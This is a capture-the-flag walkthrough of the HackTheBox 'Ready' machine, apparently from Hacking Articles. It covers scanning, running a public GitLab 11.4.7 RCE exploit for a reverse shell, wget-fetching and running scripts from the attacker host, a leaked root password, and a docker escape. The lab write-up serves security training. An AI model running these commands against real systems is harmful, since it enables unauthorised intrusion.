@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Ready HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ready-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-25T14:21:58+00:00">May 25, 2021</time><time class="updated" datetime="2025-06-20T17:39:31+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello! Everyone and Welcome to yet another CTF challenge from Hack the Box, called ‘Ready,’ which is available online for those who want to increase their skills in penetration testing and Black box testing. The challenge was designed by bertolis.</span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Medium</span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> Find user.txt and root.txt in the victim’s machine</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP service  </span></li>
+<li><span style="color: #000000;">Enumerating Gitlab pages</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting Gitlab 11.4.7 RCE</span></li>
+<li><span style="color: #000000;">Spawning TTY Shell  </span></li>
+<li><span style="color: #000000;">Linpeas to search for possible paths to escalate privileges</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Escaping privilege docker container</span></li>
+<li><span style="color: #000000;">Uploading bash script to gain root access</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Capturing the flag</strong></span></p>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">Let’s get started then!</span></p>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned to Ready machine: <strong>10.129.149.69</strong></span></p>
+<p><span style="color: #000000;">Let us scan the VM with the most popular port scanning tool, nmap to enumerate open ports on the machine</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.149.69</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pma9i3U_I34/YK0FSk011ZI/AAAAAAAAwOc/2wG3K_Ty_JUVlA8rIpSpvO2J-gfyvK4mgCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">From the result above we found two working ports on the VM, ports that ran services such as SSH(22), NGINX(5080).</span></p>
+<p><span style="color: #000000;">Since we don’t have the credentials for the SSH so we cannot enumerate it. The only service that is left is the NGINX service.</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Starting with the nginx service, we try to enumerate by accessing the IP Address and port of the target machine on a Web Browser. We see a website that features gitlab service and redirects us to sign-in page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yh1L_V8qDGk/YK0FW6Qma2I/AAAAAAAAwOg/vGeBV5zA2solglQOdSCwpqUQ7OQubmQlACLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Since there is a registration option so we immediately went to the register page to see if we can register.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xKfHAJIgrEY/YK0Fa7o-tlI/AAAAAAAAwOk/NofKUSYX_SwZU4cHdyRNyKVXS7lTUiP-wCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Once registered, we noticed that it says “update asap” in red, usually, if we see a web application that is running an old version then there are high chances that the version will have several vulnerabilities.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3KiaW_GUJDs/YK0Feh5By5I/AAAAAAAAwOo/dbQCqoGrPKwxqBddoQ_VCVrxTfIOQyt-QCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Next, we searched for an exploit of GitLab version 11.4.7 on the searchsploit and we found a remote code execution (RCE) exploit is available. So, we quickly downloaded the available RCE exploit to our local machine and checked for required parameters.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit gitlab 11.4.7 
+searchsploit -m 49334 
+cat 49334.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B273VXuaON4/YK0Fj6Xp6UI/AAAAAAAAwOw/dDaoV5Au6iQ7AQuIRWI7vVWZnJSCwYrjgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Since it is a python file, we executed it to take reverse shell by running it with required parameters.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 49334.py -g http://10.129.149.69 -u ignite -p 12345678 -l 10.10.14.108 -P 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1cTyq_a8yBU/YK0FqSeXzAI/AAAAAAAAwO0/nqmR9OWCRocKZEKgfeUvdq8xR84qKs9LgCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Next, we started netcat listener on port 1234 in another terminal which successfully gave us a simple reverse shell of the user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+id</pre>
+<p><span style="color: #000000;">To access the proper terminal, we run following python one-liner command. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd /tmp</pre>
+<p><span style="color: #000000;">So, to exploit further to get root shell, we uploaded linpeas from local machine to victim machine, the script will look for possible paths to escalate privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.14.108:8000/linpeas.sh 
+chmod 777 linpeas.sh 
+./linpeas.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0Vt0t-g8c2Q/YK0FuCDkMOI/AAAAAAAAwO8/baaascdul9EUlZAprWXpVr87mj61MAm-wCLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">The result below from linpeas tell us that we are in docker container, so we do some enumeration.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-IrzSKeM-AGI/YK0FzLifMwI/AAAAAAAAwPA/x5-9rtg3-2sMjnfE98s_auKbPrjW6BxygCLcBGAsYHQ/s16000/9.png"/></strong></span></p>
+<p><span style="color: #000000;">After enumeration we found gitlab.rb inside the directory /opt/backup and the file contains SMTP user login credentials. The credentials are useful for us if they are used by other users such as root. So, when we tried to login as root, and we successfully logged in.</span></p>
+<p><span style="color: #000000;">But when we looked for root.txt it was not present in the root directory because we are in privilege docker container which can be escaped to get the root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /opt 
+ls 
+cd /backup 
+ls 
+cat gitlab.rb | grep password 
+su root 
+Password : wW59U!ZKMbG9+*#h</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qiARL1kh8V8/YK0F6tchgAI/AAAAAAAAwPI/ey7pivyGtxQykwZVLcDqqNJdOhTlmfL8gCLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #000000;"><strong>Escaping docker container</strong></span></h3>
+<p><span style="color: #000000;">So, to get the root flag and to escape docker container we created a bash on our local machine with the help of the article <a style="color: #000000;" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation">here</a>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oK6GS6-2uIo/YK0F_jqeodI/AAAAAAAAwPQ/SELC6C2IY681uZyOBlS4lqLrjB5Afj8pQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Next, we started python one liner SimpleHttpServer in our local machine to transfer the file from our machine to victim machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SCN_eCeEpx4/YK0GECQscwI/AAAAAAAAwPY/rjSvVNoA1_cFTEeol88sdxyJO5IgP8vowCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">On the victim machine, we move into the tmp directory and used wget to download the bash that was hosted on our local machine. We changed its permissions to make it executable and then ran it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp 
+wget 10.10.14.108:8000/raj.sh 
+chmod 777 raj.sh 
+./raj.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yVxZdpCYkDg/YK0GInWLThI/AAAAAAAAwPc/QHtH_WlBFLQpbD7-MBzjO6esNwlhMLlHwCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Finally, we started the netcat listener on port 9000 in another terminal which gave us a reverse shell of the root user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 9000 
+cd /root 
+ls 
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rIy4H-DjqK8/YK0GNgRBPsI/AAAAAAAAwPk/9ns1TsyVvxIOyBQX8xpLiRLZsssOQ4A_ACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Prabhjot Dunglay</strong> is a Cyber Security Enthusiast with 2 years of experience in Penetration Testing at Hacking Articles, Ignite technologies. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/prabhjotdunglay">here</a></strong>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
